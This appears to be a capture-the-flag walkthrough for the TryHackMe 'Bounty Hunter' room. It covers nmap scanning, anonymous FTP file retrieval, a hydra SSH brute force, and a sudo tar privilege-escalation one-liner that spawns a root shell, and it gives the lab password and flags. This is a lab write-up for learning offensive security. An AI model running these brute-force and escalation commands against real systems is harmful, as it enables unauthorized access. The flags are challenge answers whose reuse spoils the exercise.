# Bounty_Hunter_THM

### Find open ports on the machine
    nmap -A -sV -O -T4 <IP> nmap 

![Screenshot 2022-02-07 123805](https://user-images.githubusercontent.com/86057471/152778765-ba6e1a7f-aeee-4473-af2c-df6195bc68f2.png)

### Who wrote the task list?
   Using nmap we can see that ftp is open so we can connect to that: ftp <IP>\
    We then need to login as a user: anonymous
    
![image](https://user-images.githubusercontent.com/86057471/152773252-433f1f4a-bfb3-4a24-8d2b-fb8775aed28a.png)

   Using ls we find two files, locks.txt and task.txt\
    To view it we need to download it to our directory: get task.txt, get locks.txt
    
![get](https://user-images.githubusercontent.com/86057471/152773499-0f2e8239-8f63-4a84-9a1e-ad9c90f7f48b.png)

   Back in our directory we see we now have both files.\
    Let's print out the contents of the files: cat task.txt, cat locks.txt
    
![cat](https://user-images.githubusercontent.com/86057471/152774079-42991961-e195-446a-8397-cd9720d81d25.png)

   Looking at the contents of the file of task.txt we see 2 task written by user **lin**
  
### What service can you bruteforce with the text file found?
**ssh**
  
### What is the users password? 
Printing out the contents of locks.txt we got a list of passwords.\
Now with a user(lin) and a list of passwords we can use hydra to login with ssh.\
hydra -t 16 -l lin -P locks.txt -vV <IP> ssh 
    
![hydra](https://user-images.githubusercontent.com/86057471/152775416-0949d903-8475-423e-84a2-3fb37173c826.png)

We get the password **RedDr4gonSynd1cat3**
  
### user.txt
Let's login with ssh and the password
    
 ![ssh login](https://user-images.githubusercontent.com/86057471/152775754-e58cf0bd-c2a7-419d-a1a6-cc9f46c004b3.png)

Find the user.txt: find / -name user.txt\
The file is in /home/lin/Desktop/user.txt
    
 ![user txt](https://user-images.githubusercontent.com/86057471/152776740-2ecd1929-6917-4fa8-9133-23f8dff54f1c.png)

Let's go over there and print to contents: We get **THM{CR1M3_SyNd1C4T3}**
 
### root.txt
If we try to cd to root we see that we don't have permission\
We can check of lin has any sudo commands she can run: sudo -l
    
 ![sudo -l](https://user-images.githubusercontent.com/86057471/152777807-d52bdf01-2fe5-4036-af2a-75b6addb1edc.png)

Lin can run /bin/tar as root\
Using GTFOBins we can elevate our privilege: https://gtfobins.github.io/gtfobins/tar/ : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\
Now that we have root we can cat root.txt: **THM{80UN7Y_h4cK3r}**
    
 ![image](https://user-images.githubusercontent.com/86057471/152778445-e5d1d6cd-bd81-421d-98e0-4d9d27dc03b5.png)

    
  

    
    
